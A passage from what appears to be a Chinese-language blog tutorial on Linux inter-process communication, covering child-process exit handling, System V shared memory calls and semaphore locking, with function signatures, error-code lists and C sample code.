status = <span class="number">0</span>;</span><br><span class="line">        <span class="type">pid_t</span> waitProcessID = <span class="built_in">wait</span>(&amp;status);</span><br><span class="line">        <span class="keyword">if</span> (waitProcessID == processID) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">WIFEXITED</span>(status) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//子进程正常结束</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">WEXITSTATUS</span>(status) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;the return code is %d.&quot;</span>, <span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//子进程非正常结束</span></span><br><span class="line">                <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;the child process %d exit abnormally.&quot;</span>, waitProcessID);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//子进程结束执行代码</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (processID == <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="comment">//没有子进程在运行</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//其他子进程结束代码</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//创建错误代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>进程相互之间的变量包括指针指向的地址都是不共享的，进程间通信需要使用共享内存。</p>
<h3 id="获取ID（ftok）"><a href="#获取ID（ftok）" class="headerlink" title="获取ID（ftok）"></a><span id="ftok">获取ID（ftok）</span></h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 获取一个key值用于共享内存或消息队列</span></span><br><span class="line"><span class="comment"> * @param fname 指定一个文件名</span></span><br><span class="line"><span class="comment"> * @param id 子序号</span></span><br><span class="line"><span class="comment"> * @return 共享内存ID；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">key_t</span> <span class="title">ftok</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fname, <span class="type">int</span> id)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="获取或创建共享内存（shmget）"><a href="#获取或创建共享内存（shmget）" class="headerlink" title="获取或创建共享内存（shmget）"></a>获取或创建共享内存（shmget）</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 获取或者创建共享内存</span></span><br><span class="line"><span class="comment"> * @param key 共享内存ID，一般为ftok获取的ID</span></span><br><span class="line"><span class="comment"> * @param size 共享内存大小</span></span><br><span class="line"><span class="comment"> * @param shmflg 标示属性，使用时需要与IPC对象存取权限（如0600）进行|运算来确定信号量集的存取权限</span></span><br><span class="line"><span class="comment"> * @return 共享内存ID；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">shmget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">size_t</span> size, <span class="type">int</span> shmflg)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">errno               <span class="comment">//错误码</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">strerror</span><span class="params">(errno)</span>     <span class="comment">//错误信息字符串</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>函数传入值对应的操作</li>
</ul>
<table>
<thead>
<tr>
<th>key</th>
<th>size</th>
<th>shmflg</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>x</td>
<td>x</td>
<td>IPC_CREAT $\mid$ 0600</td>
<td>建立新的共享内存对象，不存在与key相同的则创建，存在返回key</td>
</tr>
<tr>
<td>x</td>
<td>x</td>
<td>IPC_CREAT $\mid$ IPC_EXCL $\mid$ 0600</td>
<td>建立新的共享内存对象，不存在与key相同的则创建，存在报错</td>
</tr>
<tr>
<td>x</td>
<td>0</td>
<td>0</td>
<td>获取共享内存</td>
</tr>
</tbody></table>
<ul>
<li>错误代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EINVAL：参数size小于SHMMIN或大于SHMMAX</span><br><span class="line">EEXIST：预建立key所指的共享内存，但已经存在</span><br><span class="line">EIDRM：参数key所指的共享内存已经删除</span><br><span class="line">ENOSPC：超过了系统允许建立的共享内存的最大值(SHMALL)</span><br><span class="line">ENOENT：参数key所指的共享内存不存在，而参数shmflg未设IPC_CREAT位</span><br><span class="line">EACCES：没有权限</span><br><span class="line">ENOMEM：核心内存不足</span><br></pre></td></tr></table></figure>

<h3 id="链接共享内存到进程中（shmat）"><a href="#链接共享内存到进程中（shmat）" class="headerlink" title="链接共享内存到进程中（shmat）"></a>链接共享内存到进程中（shmat）</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 链接共享内存到当前进程</span></span><br><span class="line"><span class="comment"> * @param shmid 共享内存标识符</span></span><br><span class="line"><span class="comment"> * @param shmaddr 指定链接为内存的哪一块地址，NULL让操作系统自己选择</span></span><br><span class="line"><span class="comment"> * @param shmflg SHM_RDONLY，为只读模式；其他为读写模式</span></span><br><span class="line"><span class="comment"> * @return 共享内存地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">shmat</span><span class="params">(<span class="type">int</span> shmid, <span class="type">const</span> <span class="type">void</span> *shmaddr, <span class="type">int</span> shmflg)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">errno               <span class="comment">//错误码</span></span></span><br><span class="line"><span class="function"><span class="title">strerror</span><span class="params">(errno)</span>     <span class="comment">//错误信息字符串</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>错误代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EACCES：无权限以指定方式连接共享内存</span><br><span class="line">EINVAL：无效的参数shmid或shmaddr</span><br><span class="line">ENOMEM：核心内存不足</span><br></pre></td></tr></table></figure>

<h3 id="取消链接共享内存到进程中（shmdt）"><a href="#取消链接共享内存到进程中（shmdt）" class="headerlink" title="取消链接共享内存到进程中（shmdt）"></a>取消链接共享内存到进程中（shmdt）</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 链接共享内存到当前进程</span></span><br><span class="line"><span class="comment"> * @param shmaddr 共享内存地址</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">shmdt</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *shmaddr)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">errno               <span class="comment">//错误码</span></span></span><br><span class="line"><span class="function"><span class="title">strerror</span><span class="params">(errno)</span>     <span class="comment">//错误信息字符串</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>错误代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EINVAL：无效的参数shmaddr</span><br></pre></td></tr></table></figure>

<h3 id="共享内存管理"><a href="#共享内存管理" class="headerlink" title="共享内存管理"></a>共享内存管理</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 链接共享内存到当前进程</span></span><br><span class="line"><span class="comment"> * @param shmid 共享内存标识符</span></span><br><span class="line"><span class="comment"> * @param cmd 操作命令</span></span><br><span class="line"><span class="comment"> * @param buf 管理结构体</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">shmctl</span><span class="params">(<span class="type">int</span> shmid, <span class="type">int</span> cmd, <span class="keyword">struct</span> shmid_ds *buf)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">errno               <span class="comment">//错误码</span></span></span><br><span class="line"><span class="function"><span class="title">strerror</span><span class="params">(errno)</span>     <span class="comment">//错误信息字符串</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>cmd</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IPC_STAT：得到共享内存的状态，把共享内存的shmid_ds结构复制到buf中</span><br><span class="line">IPC_SET：改变共享内存的状态，把buf所指的shmid_ds结构中的uid、gid、mode复制到共享内存的shmid_ds结构内</span><br><span class="line">IPC_RMID：删除这片共享内存</span><br></pre></td></tr></table></figure>

<ul>
<li>错误代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EACCESS：参数cmd为IPC_STAT，确无权限读取该共享内存</span><br><span class="line">EFAULT：参数buf指向无效的内存地址</span><br><span class="line">EIDRM：标识符为msqid的共享内存已被删除</span><br><span class="line">EINVAL：无效的参数cmd或shmid</span><br><span class="line">EPERM：参数cmd为IPC_SET或IPC_RMID，却无足够的权限执行</span><br></pre></td></tr></table></figure>

<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="type">key_t</span> key = <span class="built_in">ftok</span>(<span class="string">&quot;.&quot;</span>, <span class="number">0x01</span>);</span><br><span class="line">    <span class="keyword">if</span> (key &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;ftok failed, key %d&quot;</span>, key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取共享内存</span></span><br><span class="line">    <span class="type">int</span> shmid = <span class="built_in">shmget</span>(key, <span class="built_in">sizeof</span>(<span class="type">int</span>), <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span> (shmid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;shmget failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((pid = fork()) == <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将共享内存连接到当前进程的地址空间</span></span><br><span class="line">    <span class="type">int</span> *data = (<span class="type">int</span> *) <span class="built_in">shmat</span>(shmid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == (<span class="type">int</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;shmat fail, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//把共享内存从当前进程中分离</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">shmdt</span>(data) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;shmdt failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除共享内存</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">shmctl</span>(shmid, IPC_RMID, <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;shmctl(IPC_RMID) failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//子进程</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//把共享内存从当前进程中分离</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">shmdt</span>(data) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;shmdt failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="进程锁（信号量）"><a href="#进程锁（信号量）" class="headerlink" title="进程锁（信号量）"></a>进程锁（信号量）</h2><p>进程相互之间的变量包括指针指向的地址都是不共享的，进程间通信需要使用共享内存。</p>
<h3 id="获取ID（ftok）-1"><a href="#获取ID（ftok）-1" class="headerlink" title="获取ID（ftok）"></a>获取ID（ftok）</h3><p><a href="#ftok">同上</a></p>
<h3 id="获取或创建信号量（shmget）"><a href="#获取或创建信号量（shmget）" class="headerlink" title="获取或创建信号量（shmget）"></a>获取或创建信号量（shmget）</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 获取或者创建信号量</span></span><br><span class="line"><span class="comment"> * @param key 信号量ID，一般为ftok获取的ID</span></span><br><span class="line"><span class="comment"> * @param num_sems 信号量个数</span></span><br><span class="line"><span class="comment"> * @param sem_flags 标示属性，使用时需要与IPC对象存取权限（如0600）进行|运算来确定信号量集的存取权限</span></span><br><span class="line"><span class="comment"> * @return 共享内存ID；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">semget</span><span class="params">(<span class="type">key_t</span> key, <span class="type">int</span> num_sems, <span class="type">int</span> sem_flags)</span></span>;</span><br><span class="line"></span><br><span class="line">errno               <span class="comment">//错误码</span></span><br><span class="line"><span class="built_in">strerror</span>(errno)     <span class="comment">//错误信息字符串</span></span><br></pre></td></tr></table></figure>

<ul>
<li>函数传入值对应的操作</li>
</ul>
<table>
<thead>
<tr>
<th>key</th>
<th>size</th>
<th>shmflg</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>x</td>
<td>x</td>
<td>IPC_CREAT $\mid$ 0600</td>
<td>建立新的信号量，不存在与key相同的则创建，存在返回key</td>
</tr>
<tr>
<td>x</td>
<td>x</td>
<td>IPC_CREAT $\mid$ IPC_EXCL $\mid$ 0600</td>
<td>建立新的信号量，不存在与key相同的则创建，存在报错</td>
</tr>
<tr>
<td>x</td>
<td>0</td>
<td>0</td>
<td>获取信号量</td>
</tr>
</tbody></table>
<ul>
<li>错误代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EACCES：没有访问该信号量集的权限</span><br><span class="line">EEXIST：信号量集已经存在，无法创建</span><br><span class="line">EINVAL：参数nsems的值小于0或者大于该信号量集的限制；或者是该key关联的信号量集已存在，并且nsems</span><br><span class="line">大于该信号量集的信号量数</span><br><span class="line">ENOENT：信号量集不存在，同时没有使用IPC_CREAT</span><br><span class="line">ENOMEM ：没有足够的内存创建新的信号量集</span><br><span class="line">ENOSPC：超出系统限制</span><br></pre></td></tr></table></figure>

<h3 id="信号量操作（PV操作）"><a href="#信号量操作（PV操作）" class="headerlink" title="信号量操作（PV操作）"></a>信号量操作（PV操作）</h3><p>此操作会导致进程阻塞，用于进程间加锁使用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 信号量操作</span></span><br><span class="line"><span class="comment"> * @param semid 信号量ID</span></span><br><span class="line"><span class="comment"> * @param sops 操作结构体</span></span><br><span class="line"><span class="comment"> * @param nsops 操作的信号量的个数</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">semop</span><span class="params">(<span class="type">int</span> semid, <span class="keyword">struct</span> sembuf *sops, <span class="type">size_t</span> nsops)</span>；</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @description 信号量操作</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @param semid 信号量ID</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @param sops 操作结构体</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @param nsops 操作的信号量的个数</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @param timespec 等待时间</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @return 0，成功；-1，错误，原因存于error中</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">semtimedop</span><span class="params">(<span class="type">int</span> semid, <span class="keyword">struct</span> sembuf *sops, <span class="type">unsigned</span> nsops, <span class="keyword">struct</span> timespec *timeout)</span></span>;</span><br><span class="line"></span><br><span class="line">errno               <span class="comment">//错误码</span></span><br><span class="line"><span class="built_in">strerror</span>(errno)     <span class="comment">//错误信息字符串</span></span><br></pre></td></tr></table></figure>

<ul>
<li>sembuf结构</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">sembuf</span>&#123;</span><br><span class="line">    <span class="type">short</span> sem_num;  <span class="comment">// 信号量序号，从0开始</span></span><br><span class="line">    <span class="type">short</span> sem_op;   <span class="comment">// 信号量在一次操作中需要改变的数据，通常是两个数，一个是-1，即P（等待）操作，</span></span><br><span class="line">                    <span class="comment">// 一个是+1，即V（发送信号）操作。</span></span><br><span class="line">    <span class="type">short</span> sem_flg;  <span class="comment">//信号量操作标示</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>sem_flg</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">IPC_NOWAIT  <span class="comment">//对信号的操作不能满足时，semop()不会阻塞，并立即返回，同时设定错误信息。</span></span><br><span class="line">SEM_UNDO    <span class="comment">//程序结束时(不论正常或不正常)，保证信号值会被重设为semop()调用前的值。这样做的目的在于避免程序在异常情况下结束时未将锁定的资源解锁，造成该资源永远锁定。</span></span><br></pre></td></tr></table></figure>

<ul>
<li>错误代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E2BIG：一次对信号的操作数超出系统的限制</span><br><span class="line">EACCES：调用进程没有权能执行请求的操作，并且不具有CAP_IPC_OWNER权能</span><br><span class="line">EAGAIN：信号操作暂时不能满足，需要重试</span><br><span class="line">EFAULT：sops或timeout指针指向的空间不可访问</span><br><span class="line">EFBIG：sem_num指定的值无效</span><br><span class="line">EIDRM：信号集已被移除</span><br><span class="line">EINTR：系统调用阻塞时，被信号中断</span><br><span class="line">EINVAL：参数无效</span><br><span class="line">ENOMEM：内存不足</span><br><span class="line">ERANGE：信号所允许的值越界</span><br></pre></td></tr></table></figure>

<h3 id="信号量管理"><a href="#信号量管理" class="headerlink" title="信号量管理"></a>信号量管理</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 信号量管理</span></span><br><span class="line"><span class="comment"> * @param sem_id 信号量ID</span></span><br><span class="line"><span class="comment"> * @param sem_num 信号量序号，从0开始</span></span><br><span class="line"><span class="comment"> * @param command 操作符</span></span><br><span class="line"><span class="comment"> * @param ... 操作参数</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于error中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">semctl</span><span class="params">(<span class="type">int</span> sem_id, <span class="type">int</span> sem_num, <span class="type">int</span> command, ...)</span></span>;</span><br><span class="line"></span><br><span class="line">errno               <span class="comment">//错误码</span></span><br><span class="line"><span class="built_in">strerror</span>(errno)     <span class="comment">//错误信息字符串</span></span><br></pre></td></tr></table></figure>

<ul>
<li>command</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SETVAL：用来把信号量初始化为一个已知的值。p 这个值通过union semun中的val成员设置，其作用是在信号量第一次使用前对它进行设置。</span><br><span class="line">IPC_RMID：用于删除一个已经无需继续使用的信号量标识符。</span><br></pre></td></tr></table></figure>

<ul>
<li>错误代码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">EACCES(权限不够)</span><br><span class="line">EFAULT(arg指向的地址无效)</span><br><span class="line">EIDRM(信号量集已经删除)</span><br><span class="line">EINVAL(信号量集不存在，或者semid无效)</span><br><span class="line">EPERM(EUID没有cmd的权利)</span><br><span class="line">ERANGE(信号量值超出范围)</span><br></pre></td></tr></table></figure>

<h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="type">key_t</span> key = <span class="built_in">ftok</span>(<span class="string">&quot;.&quot;</span>, <span class="number">0x01</span>);</span><br><span class="line">    <span class="keyword">if</span> (key &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;ftok failed, key %d&quot;</span>, key);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取信号量</span></span><br><span class="line">    <span class="type">int</span> semId = <span class="built_in">semget</span>(key, <span class="number">1</span>, IPC_CREAT | <span class="number">0600</span>);</span><br><span class="line">    <span class="keyword">if</span> (semId == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;semget failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置初始值</span></span><br><span class="line">    <span class="type">int</span> code = <span class="built_in">semctl</span>(semId, <span class="number">0</span>, SETVAL, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (code == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;semctl failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((pid = fork()) == <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//申请信号量，上锁</span></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">sembuf</span> signal;</span><br><span class="line">        signal.sem_op = <span class="number">-1</span>;</span><br><span class="line">        signal.sem_flg = SEM_UNDO;</span><br><span class="line">        signal.sem_num = <span class="number">0</span>;</span><br><span class="line">        code = <span class="built_in">semop</span>(semId, &amp;signal, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;semop failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//释放信号量，解锁</span></span><br><span class="line">        signal.sem_op = <span class="number">1</span>;</span><br><span class="line">        code = <span class="built_in">semop</span>(semId, &amp;signal, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;semop failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//父进程</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//删除信号量</span></span><br><span class="line">        <span class="type">int</span> code = <span class="built_in">semctl</span>(semId, <span class="number">0</span>, IPC_RMID);</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">LOG_ERROR</span>(<span class="string">&quot;semctl failed, %d, %s&quot;</span>, errno, <span class="built_in">strerror</span>(errno));</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//子进程</span></span><br><span class="line">        ...</span><br><span class="line">    